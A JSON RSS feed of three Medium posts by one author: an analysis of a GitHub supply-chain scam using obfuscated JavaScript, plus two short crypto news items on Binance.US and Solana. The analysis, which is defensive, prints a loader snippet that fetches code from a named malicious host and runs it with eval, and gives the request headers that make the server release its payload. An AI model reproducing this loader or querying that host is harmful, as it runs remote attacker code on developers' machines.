{"status":"ok","feed":{"url":"https://medium.com/feed/@amanbora30172","title":"Stories by Aman Bora on Medium","link":"https://medium.com/@amanbora30172?source=rss-12e2b2491c4b------2","author":"","description":"Stories by Aman Bora on Medium","image":"https://cdn-images-1.medium.com/fit/c/150/150/0*AxREsrGJYJB8_Wmh"},"items":[{"title":"Unmasking Obfuscated JavaScript: A Deep Dive into Modern Scam Techniques Involving Malicious\u2026","pubDate":"2025-01-11 15:26:05","link":"https://medium.com/@amanbora30172/unmasking-obfuscated-javascript-a-deep-dive-into-modern-scam-techniques-involving-malicious-222221a6d228?source=rss-12e2b2491c4b------2","guid":"https://medium.com/p/222221a6d228","author":"Aman Bora","thumbnail":"","description":"\n<h3>Unmasking Obfuscated JavaScript: A Deep Dive into Modern Scam Techniques Involving Malicious Payloads</h3>\n<h3>Decoding the Hidden Threats Lurking in Your Code: How Cybercriminals Use Obfuscation to Exploit Web Applications</h3>\n<h3>Introduction: The Growing Threat in the JavaScript Ecosystem</h3>\n<p>In 2023 alone, over 1.6 million websites were compromised by malicious JavaScript libraries, many of which went undetected for months. As attackers grow more sophisticated, they\u2019re using obfuscation to hide dangerous payloads within seemingly legitimate code. JavaScript, the backbone of modern web development, is especially vulnerable due to its flexibility and widespread use. This article dives into a recent case where obfuscated JavaScript was deployed through a compromised API, delivering harmful payloads under specific conditions. We\u2019ll explore how developers can reverse-engineer and decode these malicious scripts using tools like Postman, tricking APIs into revealing their true\u00a0nature.</p>\n<h3>The Setup: A Seemingly Innocent Repository</h3>\n<p>The scam originated from a GitHub repository that appeared legitimate at first glance but contained obfuscated JavaScript designed to interact with a malicious API hosted at <a href=\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3d5e66c8b007b7a2eb\">http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3d5e66c8b007b7a2eb</a>. This API acted as a delivery mechanism for malicious code, returning harmful payloads only under specific conditions. When accessed externally, the API returned a harmless 404 error, but when queried from specific environments, it delivered obfuscated malicious JavaScript.</p>\n<p>Several repositories were found to interact with this API, including:</p>\n<ul>\n<li><a href=\"https://github.com/DreamDevsOrg/ThetaScreener\"><strong>DreamDevsOrg/ThetaScreener</strong></a></li>\n<li><a href=\"https://github.com/VictorFeitosa-star/Full-Dev\"><strong>VictorFeitosa-star/Full-Dev</strong></a></li>\n<li><a href=\"https://github.com/Rahman1014/YAMTOKEN\"><strong>Rahman1014/YAMTOKEN</strong></a></li>\n</ul>\n<p>You can find all such projects using these search\u00a0link:</p>\n<ul><li><a href=\"https://github.com/search?q=http%3A%2F%2Fpayloadrpc.com%2Fapi%2F&amp;type=code\"><strong>Search GitHub</strong></a></li></ul>\n<h3>The Developer\u2019s Trap: A Case in\u00a0Action</h3>\n<p>Imagine you\u2019re a developer working on a new feature. You come across a popular JavaScript library on GitHub. The code looks fine after all, it\u2019s widely used and has multiple stars. Unbeknownst to you, the library makes calls to the malicious API mentioned earlier. On the surface, everything functions as expected. But when the library is deployed into specific environments, it activates an obfuscated payload that steals user data or compromises your application.</p>\n<p>This is the danger of environment-sensitive attacks. The malicious code blends seamlessly into normal web development workflows, and even seasoned developers can overlook the red\u00a0flags.</p>\n<h3>How the Scam Works: A Deep Dive into the\u00a0Code</h3>\n<p>The attackers crafted their malicious API to return different responses depending on the environment in which it is accessed. If an external request is made, the API responds with a benign 404 error. However, when queried from a local machine or through developer tools with specific headers, it returns a 500 error along with an obfuscated payload. This payload is executed using JavaScript\u2019s dangerous eval function, potentially compromising the entire application.</p>\n<p>Here\u2019s a simplified code snippet showing how the payload is fetched and executed:</p>\n<pre>const getRPCNode = (() =&gt; {<br>    axios.get(\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3\")<br>        .then(res =&gt; {<br>            rpcNode = res.data;<br>        })<br>        .catch(error =&gt; {<br>            eval(error.response.data);  // Executes the malicious payload<br>        });<br>})();</pre>\n<h3>Using Postman to Decode the Malicious Payload</h3>\n<p>What makes this scam particularly interesting is how developers can trick the API into revealing its malicious payload using <strong>Postman</strong>, an API testing tool. The malicious API does not always return the payload unless it detects that it\u2019s being accessed under specific conditions. By manipulating request headers, you can fool the API into thinking it\u2019s being accessed by the compromised application.</p>\n<p><strong>Step-by-Step Process to Decode the\u00a0Payload</strong>:</p>\n<ol>\n<li>\n<strong>Modify Request Headers</strong>: The key to decoding the payload is mimicking the conditions of the original environment. Using Postman, modify the headers to simulate requests from a local machine using the Axios library:<br><strong>Host</strong>: localhost<br><strong>User-Agent</strong>: axios/0.21.1</li>\n<li>\n<strong>Send a Request to the API</strong>: Send a GET request to the malicious API endpoint with the modified headers:<br>\u201c<a href=\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3\">http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3</a>\u201d</li>\n<li>\n<strong>Receive the Obfuscated Payload</strong>: If done correctly, the API will return a 500 error along with the obfuscated payload instead of the harmless 404 response. The payload is likely heavily obfuscated, resembling something like\u00a0this:</li>\n</ol>\n<pre>(function(_0x32edc5,_0x463f0d){<br>    function _0x3aabc0(_0x1f8929,_0x5){<br>        _0x25d9(_0x522541 - -0x248, _0x32534a);<br>    }<br>    const _0x8ed65e = _0x32edc5(...);<br>    ...<br>    eval(_0x8ed65e.shift());<br>})();</pre>\n<h3>Tools of the Trade: Decoding the\u00a0Payload</h3>\n<p>Once you\u2019ve obtained the obfuscated payload, the next step is to reverse engineer it. Although the code might look confusing at first glance, several tools and techniques can help you uncover its true functionality:</p>\n<ul>\n<li>\n<strong>JS Beautifier</strong>: This tool formats obfuscated code into readable JavaScript, making it easier to understand.</li>\n<li>\n<strong>CyberChef</strong>: A powerful tool for converting hex or base64 encoded strings back into readable\u00a0text.</li>\n<li>\n<strong>Console.log() Debugging</strong>: Inserting console.log statements into the obfuscated code can help you follow the flow of execution and understand what\u2019s happening under the\u00a0hood.</li>\n</ul>\n<p>By using these methods, you can untangle the code and identify how the malicious payload is activated in the compromised environment.</p>\n<h3>Consequences of the Scam: Beyond Data\u00a0Theft</h3>\n<p>This scam\u2019s implications stretch far beyond simple data theft. By embedding malicious payloads in widely used JavaScript libraries, attackers can infect multiple applications that rely on these libraries. Developers who unknowingly include these compromised libraries risk exposing not only their systems but also their users to serious\u00a0threats.</p>\n<p>Worse still, because the malicious code blends so seamlessly into normal development workflows, it can be difficult to detect\u200a\u2014\u200aeven for experienced developers.</p>\n<h3>Best Practices: How Developers Can Protect Themselves</h3>\n<p>To protect against these types of attacks, developers must adopt rigorous security practices. Here are a few essential steps:</p>\n<ol>\n<li>\n<strong>Vet Third-Party Libraries</strong>: Always review the source code of any third-party library before integrating it into your projects. Be especially cautious of obfuscated code and any instances of the eval function.</li>\n<li>\n<strong>Use Static Analysis Tools</strong>: Employ static analysis tools such as <strong>Snyk</strong> or <strong>npm audit</strong> to flag obfuscated code or dangerous patterns. These tools can help detect malicious code before it becomes a\u00a0problem.</li>\n<li>\n<strong>Monitor Network Traffic</strong>: Regularly inspect outgoing network requests from your applications. Requests to unknown or suspicious endpoints should be a major red\u00a0flag.</li>\n<li>\n<strong>Isolate Development Environments</strong>: Always test code that interacts with external APIs in sandboxed or isolated environments. This minimizes the risk of a system-wide compromise during development.</li>\n</ol>\n<h3>Conclusion: Evolving JavaScript Scams and the Need for Vigilance</h3>\n<p>This investigation reveals how modern JavaScript scams are evolving, using obfuscation techniques and environment-sensitive payloads to hide malicious code in plain sight. By leveraging tools like Postman, developers can decode and understand these payloads, staying one step ahead of attackers.</p>\n<p>The key takeaway? Never blindly trust third-party libraries or external APIs. Inspect, test, and validate everything that enters your development pipeline to protect your applications and users. In a world where even the most trusted libraries can be compromised, vigilance is the best\u00a0defense.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=222221a6d228\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<h3>Unmasking Obfuscated JavaScript: A Deep Dive into Modern Scam Techniques Involving Malicious Payloads</h3>\n<h3>Decoding the Hidden Threats Lurking in Your Code: How Cybercriminals Use Obfuscation to Exploit Web Applications</h3>\n<h3>Introduction: The Growing Threat in the JavaScript Ecosystem</h3>\n<p>In 2023 alone, over 1.6 million websites were compromised by malicious JavaScript libraries, many of which went undetected for months. As attackers grow more sophisticated, they\u2019re using obfuscation to hide dangerous payloads within seemingly legitimate code. JavaScript, the backbone of modern web development, is especially vulnerable due to its flexibility and widespread use. This article dives into a recent case where obfuscated JavaScript was deployed through a compromised API, delivering harmful payloads under specific conditions. We\u2019ll explore how developers can reverse-engineer and decode these malicious scripts using tools like Postman, tricking APIs into revealing their true\u00a0nature.</p>\n<h3>The Setup: A Seemingly Innocent Repository</h3>\n<p>The scam originated from a GitHub repository that appeared legitimate at first glance but contained obfuscated JavaScript designed to interact with a malicious API hosted at <a href=\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3d5e66c8b007b7a2eb\">http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3d5e66c8b007b7a2eb</a>. This API acted as a delivery mechanism for malicious code, returning harmful payloads only under specific conditions. When accessed externally, the API returned a harmless 404 error, but when queried from specific environments, it delivered obfuscated malicious JavaScript.</p>\n<p>Several repositories were found to interact with this API, including:</p>\n<ul>\n<li><a href=\"https://github.com/DreamDevsOrg/ThetaScreener\"><strong>DreamDevsOrg/ThetaScreener</strong></a></li>\n<li><a href=\"https://github.com/VictorFeitosa-star/Full-Dev\"><strong>VictorFeitosa-star/Full-Dev</strong></a></li>\n<li><a href=\"https://github.com/Rahman1014/YAMTOKEN\"><strong>Rahman1014/YAMTOKEN</strong></a></li>\n</ul>\n<p>You can find all such projects using these search\u00a0link:</p>\n<ul><li><a href=\"https://github.com/search?q=http%3A%2F%2Fpayloadrpc.com%2Fapi%2F&amp;type=code\"><strong>Search GitHub</strong></a></li></ul>\n<h3>The Developer\u2019s Trap: A Case in\u00a0Action</h3>\n<p>Imagine you\u2019re a developer working on a new feature. You come across a popular JavaScript library on GitHub. The code looks fine after all, it\u2019s widely used and has multiple stars. Unbeknownst to you, the library makes calls to the malicious API mentioned earlier. On the surface, everything functions as expected. But when the library is deployed into specific environments, it activates an obfuscated payload that steals user data or compromises your application.</p>\n<p>This is the danger of environment-sensitive attacks. The malicious code blends seamlessly into normal web development workflows, and even seasoned developers can overlook the red\u00a0flags.</p>\n<h3>How the Scam Works: A Deep Dive into the\u00a0Code</h3>\n<p>The attackers crafted their malicious API to return different responses depending on the environment in which it is accessed. If an external request is made, the API responds with a benign 404 error. However, when queried from a local machine or through developer tools with specific headers, it returns a 500 error along with an obfuscated payload. This payload is executed using JavaScript\u2019s dangerous eval function, potentially compromising the entire application.</p>\n<p>Here\u2019s a simplified code snippet showing how the payload is fetched and executed:</p>\n<pre>const getRPCNode = (() =&gt; {<br>    axios.get(\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3\")<br>        .then(res =&gt; {<br>            rpcNode = res.data;<br>        })<br>        .catch(error =&gt; {<br>            eval(error.response.data);  // Executes the malicious payload<br>        });<br>})();</pre>\n<h3>Using Postman to Decode the Malicious Payload</h3>\n<p>What makes this scam particularly interesting is how developers can trick the API into revealing its malicious payload using <strong>Postman</strong>, an API testing tool. The malicious API does not always return the payload unless it detects that it\u2019s being accessed under specific conditions. By manipulating request headers, you can fool the API into thinking it\u2019s being accessed by the compromised application.</p>\n<p><strong>Step-by-Step Process to Decode the\u00a0Payload</strong>:</p>\n<ol>\n<li>\n<strong>Modify Request Headers</strong>: The key to decoding the payload is mimicking the conditions of the original environment. Using Postman, modify the headers to simulate requests from a local machine using the Axios library:<br><strong>Host</strong>: localhost<br><strong>User-Agent</strong>: axios/0.21.1</li>\n<li>\n<strong>Send a Request to the API</strong>: Send a GET request to the malicious API endpoint with the modified headers:<br>\u201c<a href=\"http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3\">http://payloadrpc.com/api/v2/node/d6a8d0d14d3fbb3</a>\u201d</li>\n<li>\n<strong>Receive the Obfuscated Payload</strong>: If done correctly, the API will return a 500 error along with the obfuscated payload instead of the harmless 404 response. The payload is likely heavily obfuscated, resembling something like\u00a0this:</li>\n</ol>\n<pre>(function(_0x32edc5,_0x463f0d){<br>    function _0x3aabc0(_0x1f8929,_0x5){<br>        _0x25d9(_0x522541 - -0x248, _0x32534a);<br>    }<br>    const _0x8ed65e = _0x32edc5(...);<br>    ...<br>    eval(_0x8ed65e.shift());<br>})();</pre>\n<h3>Tools of the Trade: Decoding the\u00a0Payload</h3>\n<p>Once you\u2019ve obtained the obfuscated payload, the next step is to reverse engineer it. Although the code might look confusing at first glance, several tools and techniques can help you uncover its true functionality:</p>\n<ul>\n<li>\n<strong>JS Beautifier</strong>: This tool formats obfuscated code into readable JavaScript, making it easier to understand.</li>\n<li>\n<strong>CyberChef</strong>: A powerful tool for converting hex or base64 encoded strings back into readable\u00a0text.</li>\n<li>\n<strong>Console.log() Debugging</strong>: Inserting console.log statements into the obfuscated code can help you follow the flow of execution and understand what\u2019s happening under the\u00a0hood.</li>\n</ul>\n<p>By using these methods, you can untangle the code and identify how the malicious payload is activated in the compromised environment.</p>\n<h3>Consequences of the Scam: Beyond Data\u00a0Theft</h3>\n<p>This scam\u2019s implications stretch far beyond simple data theft. By embedding malicious payloads in widely used JavaScript libraries, attackers can infect multiple applications that rely on these libraries. Developers who unknowingly include these compromised libraries risk exposing not only their systems but also their users to serious\u00a0threats.</p>\n<p>Worse still, because the malicious code blends so seamlessly into normal development workflows, it can be difficult to detect\u200a\u2014\u200aeven for experienced developers.</p>\n<h3>Best Practices: How Developers Can Protect Themselves</h3>\n<p>To protect against these types of attacks, developers must adopt rigorous security practices. Here are a few essential steps:</p>\n<ol>\n<li>\n<strong>Vet Third-Party Libraries</strong>: Always review the source code of any third-party library before integrating it into your projects. Be especially cautious of obfuscated code and any instances of the eval function.</li>\n<li>\n<strong>Use Static Analysis Tools</strong>: Employ static analysis tools such as <strong>Snyk</strong> or <strong>npm audit</strong> to flag obfuscated code or dangerous patterns. These tools can help detect malicious code before it becomes a\u00a0problem.</li>\n<li>\n<strong>Monitor Network Traffic</strong>: Regularly inspect outgoing network requests from your applications. Requests to unknown or suspicious endpoints should be a major red\u00a0flag.</li>\n<li>\n<strong>Isolate Development Environments</strong>: Always test code that interacts with external APIs in sandboxed or isolated environments. This minimizes the risk of a system-wide compromise during development.</li>\n</ol>\n<h3>Conclusion: Evolving JavaScript Scams and the Need for Vigilance</h3>\n<p>This investigation reveals how modern JavaScript scams are evolving, using obfuscation techniques and environment-sensitive payloads to hide malicious code in plain sight. By leveraging tools like Postman, developers can decode and understand these payloads, staying one step ahead of attackers.</p>\n<p>The key takeaway? Never blindly trust third-party libraries or external APIs. Inspect, test, and validate everything that enters your development pipeline to protect your applications and users. In a world where even the most trusted libraries can be compromised, vigilance is the best\u00a0defense.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=222221a6d228\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":[]},{"title":"First Mover Americas: Binance.US Suspends Dollar Deposits","pubDate":"2023-06-09 15:21:34","link":"https://medium.com/@amanbora30172/first-mover-americas-binance-us-suspends-dollar-deposits-27f7987fccff?source=rss-12e2b2491c4b------2","guid":"https://medium.com/p/27f7987fccff","author":"Aman Bora","thumbnail":"","description":"\n<p><a href=\"https://binance.us/\"><strong>Binance.US</strong></a><strong> says it\u2019s temporarily </strong><a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL21hcmtldHMvMjAyMy8wNi8wOS9iaW5hbmNldXMtc3VzcGVuZHMtdXNlLW9mLWZpYXQtYXMtbGVnYWwtdHJvdWJsZXMtbW91bnQv/5f9774fb6365176ab6625f9aB5b81cee7\"><strong>transitioning</strong></a><strong> to an all-crypto exchange as of June 13, citing pressures from the U.S. Securities and Exchange Commission (SEC), which targeted the company with a major enforcement action this week. </strong>In a <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly90d2l0dGVyLmNvbS9CaW5hbmNlVVMvc3RhdHVzLzE2NjY5OTY5MDg2NTEzMjMzOTM_cmVmX3NyYz10d3NyYyU1RXRmdyU3Q3R3Y2FtcCU1RXR3ZWV0ZW1iZWQlN0N0d3Rlcm0lNUUxNjY2OTk2OTA4NjUxMzIzMzkzJTdDdHdnciU1RTFlMmYxNWQ5OTRjYjBlZDNmOWU3OTkwZmU3YzQ1NTRlZDhmODNjNWElN0N0d2NvbiU1RXMxXyZyZWZfdXJsPWh0dHBzJTNBJTJGJTJGZGVjcnlwdC5jbyUyRjE0MzkzOCUyRmJpbmFuY2UtdXMtc2hpZnRzLWNyeXB0by1vbmx5LW9wZXJhdGlvbnMtYW1pZC1pbnRlbnNpZmllZC1zZWMtc2NydXRpbnk/5f9774fb6365176ab6625f9aB77bf0518\">tweet</a>, the U.S. arm of Binance said USD and deposits will be suspended as of June 9, and USD-based trading pairs will be de-listed shortly after. Trading, staking and deposits and withdrawals in crypto will remain fully operational.</p>\n<p><strong>Cryptocurrency custody firm BitGo has reached a preliminary agreement to buy Prime Trust, another crypto custody specialist regulated in the state of Nevada. </strong>In <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly9ibG9nLmJpdGdvLmNvbS9iaXRnby1zaWducy1sZXR0ZXItb2YtaW50ZW50LXRvLWFjcXVpcmUtcHJpbWUtdHJ1c3QtdG8tZXhwYW5kLWRpZ2l0YWwtYXNzZXQtYW5kLWZpbnRlY2gtYjE4NjgzOTE3ODRh/5f9774fb6365176ab6625f9aB57baab26\">a blog post</a>, BitGo confirmed an <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL2J1c2luZXNzLzIwMjMvMDYvMDgvY3J5cHRvLWN1c3RvZHktZmlybS1iaXRnby1yZWFjaGVzLXByZWxpbWluYXJ5LWFncmVlbWVudC10by1idXktcHJpbWUtdHJ1c3Qtc291cmNlLw/5f9774fb6365176ab6625f9aBa379d029\">earlier story from CoinDesk</a> that a tentative deal had been agreed upon. In a statement, Prime Trust Interim CEO Jor Law called the move \u201ca significant enhancement for the industry.\u201d BitGo President Mike Belshe described the deal as a \u201clandmark transaction\u00a0\u2026 With the expected acquisition of Prime Trust, BitGo is well positioned to enhance its best-in-class, trusted solutions and to service the combined customer\u00a0base.\u201d</p>\n<p><strong>Coinbase (COIN) shares are \u201c</strong><a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL21hcmtldHMvMjAyMy8wNi8wOC9jb2luYmFzZS1zaGFyZXMtYXJlLXVuaW52ZXN0YWJsZS1pbi10aGUtbmVhci10ZXJtLWJlcmVuYmVyZy8/5f9774fb6365176ab6625f9aB361dcf55\"><strong>uninvestable</strong></a><strong>\u201d in the near term, investment bank Berenberg said in a research report Thursday. </strong>The company was already expected to report weak second-quarter 2023 trading volumes before the SEC filed a lawsuit against it on Tuesday, said analyst Mark Palmer. This weakness may now persist and intensify thanks to the overhang from the SEC action, he added. \u201cThe upshot is that we view COIN shares as uninvestable in the near term.\u201d Palmer maintained his hold rating on the stock, but slashed his price target to $39 from $55, suggesting nearly 30% downside from last night\u2019s close of\u00a0$54.90.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=27f7987fccff\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p><a href=\"https://binance.us/\"><strong>Binance.US</strong></a><strong> says it\u2019s temporarily </strong><a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL21hcmtldHMvMjAyMy8wNi8wOS9iaW5hbmNldXMtc3VzcGVuZHMtdXNlLW9mLWZpYXQtYXMtbGVnYWwtdHJvdWJsZXMtbW91bnQv/5f9774fb6365176ab6625f9aB5b81cee7\"><strong>transitioning</strong></a><strong> to an all-crypto exchange as of June 13, citing pressures from the U.S. Securities and Exchange Commission (SEC), which targeted the company with a major enforcement action this week. </strong>In a <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly90d2l0dGVyLmNvbS9CaW5hbmNlVVMvc3RhdHVzLzE2NjY5OTY5MDg2NTEzMjMzOTM_cmVmX3NyYz10d3NyYyU1RXRmdyU3Q3R3Y2FtcCU1RXR3ZWV0ZW1iZWQlN0N0d3Rlcm0lNUUxNjY2OTk2OTA4NjUxMzIzMzkzJTdDdHdnciU1RTFlMmYxNWQ5OTRjYjBlZDNmOWU3OTkwZmU3YzQ1NTRlZDhmODNjNWElN0N0d2NvbiU1RXMxXyZyZWZfdXJsPWh0dHBzJTNBJTJGJTJGZGVjcnlwdC5jbyUyRjE0MzkzOCUyRmJpbmFuY2UtdXMtc2hpZnRzLWNyeXB0by1vbmx5LW9wZXJhdGlvbnMtYW1pZC1pbnRlbnNpZmllZC1zZWMtc2NydXRpbnk/5f9774fb6365176ab6625f9aB77bf0518\">tweet</a>, the U.S. arm of Binance said USD and deposits will be suspended as of June 9, and USD-based trading pairs will be de-listed shortly after. Trading, staking and deposits and withdrawals in crypto will remain fully operational.</p>\n<p><strong>Cryptocurrency custody firm BitGo has reached a preliminary agreement to buy Prime Trust, another crypto custody specialist regulated in the state of Nevada. </strong>In <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly9ibG9nLmJpdGdvLmNvbS9iaXRnby1zaWducy1sZXR0ZXItb2YtaW50ZW50LXRvLWFjcXVpcmUtcHJpbWUtdHJ1c3QtdG8tZXhwYW5kLWRpZ2l0YWwtYXNzZXQtYW5kLWZpbnRlY2gtYjE4NjgzOTE3ODRh/5f9774fb6365176ab6625f9aB57baab26\">a blog post</a>, BitGo confirmed an <a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL2J1c2luZXNzLzIwMjMvMDYvMDgvY3J5cHRvLWN1c3RvZHktZmlybS1iaXRnby1yZWFjaGVzLXByZWxpbWluYXJ5LWFncmVlbWVudC10by1idXktcHJpbWUtdHJ1c3Qtc291cmNlLw/5f9774fb6365176ab6625f9aBa379d029\">earlier story from CoinDesk</a> that a tentative deal had been agreed upon. In a statement, Prime Trust Interim CEO Jor Law called the move \u201ca significant enhancement for the industry.\u201d BitGo President Mike Belshe described the deal as a \u201clandmark transaction\u00a0\u2026 With the expected acquisition of Prime Trust, BitGo is well positioned to enhance its best-in-class, trusted solutions and to service the combined customer\u00a0base.\u201d</p>\n<p><strong>Coinbase (COIN) shares are \u201c</strong><a href=\"https://link.coindesk.com/click/31742721.10879/aHR0cHM6Ly93d3cuY29pbmRlc2suY29tL21hcmtldHMvMjAyMy8wNi8wOC9jb2luYmFzZS1zaGFyZXMtYXJlLXVuaW52ZXN0YWJsZS1pbi10aGUtbmVhci10ZXJtLWJlcmVuYmVyZy8/5f9774fb6365176ab6625f9aB361dcf55\"><strong>uninvestable</strong></a><strong>\u201d in the near term, investment bank Berenberg said in a research report Thursday. </strong>The company was already expected to report weak second-quarter 2023 trading volumes before the SEC filed a lawsuit against it on Tuesday, said analyst Mark Palmer. This weakness may now persist and intensify thanks to the overhang from the SEC action, he added. \u201cThe upshot is that we view COIN shares as uninvestable in the near term.\u201d Palmer maintained his hold rating on the stock, but slashed his price target to $39 from $55, suggesting nearly 30% downside from last night\u2019s close of\u00a0$54.90.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=27f7987fccff\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":[]},{"title":"Solana Foundation: SOL Is \u2018Not a Security\u2019","pubDate":"2023-06-09 15:18:47","link":"https://medium.com/@amanbora30172/solana-foundation-sol-is-not-a-security-ddcca8e3eabd?source=rss-12e2b2491c4b------2","guid":"https://medium.com/p/ddcca8e3eabd","author":"Aman Bora","thumbnail":"","description":"\n<p>The Solana Foundation is disputing the U.S. Security and Exchange Commission\u2019s (SEC) classification of its SOL token as an unregistered security.</p>\n<p>Earlier this week, the SEC filed lawsuits against crypto exchanges <a href=\"https://binance.us/\">Binance.US</a> and Coinbase, which charged the exchanges with trading crypto asset securities, including SOL.</p>\n<p>\u201cThe Solana Foundation strongly believes that SOL is not a security,\u201d the Solana Foundation told CoinDesk in a statement. \u201cSOL is the native token to the Solana blockchain, a robust, open-source, community-based software project that relies on decentralized user and developer engagement to expand and\u00a0evolve.\u201d</p>\n<p>At Solana\u2019s Thursday hacker house event in New York City, New York it appeared the Solana community wasn\u2019t overly concerned with the chain\u2019s regulatory nuisances.</p>\n<p>\u201cI don\u2019t think any of the developers give a shit,\u201d a developer told CoinDesk at the hacker house on Thursday. \u201cSOL being a security doesn\u2019t really affect anyone building on top of\u00a0Solana.\u201d</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=ddcca8e3eabd\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>The Solana Foundation is disputing the U.S. Security and Exchange Commission\u2019s (SEC) classification of its SOL token as an unregistered security.</p>\n<p>Earlier this week, the SEC filed lawsuits against crypto exchanges <a href=\"https://binance.us/\">Binance.US</a> and Coinbase, which charged the exchanges with trading crypto asset securities, including SOL.</p>\n<p>\u201cThe Solana Foundation strongly believes that SOL is not a security,\u201d the Solana Foundation told CoinDesk in a statement. \u201cSOL is the native token to the Solana blockchain, a robust, open-source, community-based software project that relies on decentralized user and developer engagement to expand and\u00a0evolve.\u201d</p>\n<p>At Solana\u2019s Thursday hacker house event in New York City, New York it appeared the Solana community wasn\u2019t overly concerned with the chain\u2019s regulatory nuisances.</p>\n<p>\u201cI don\u2019t think any of the developers give a shit,\u201d a developer told CoinDesk at the hacker house on Thursday. \u201cSOL being a security doesn\u2019t really affect anyone building on top of\u00a0Solana.\u201d</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=ddcca8e3eabd\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["crypto","blockchain","technology"]}]}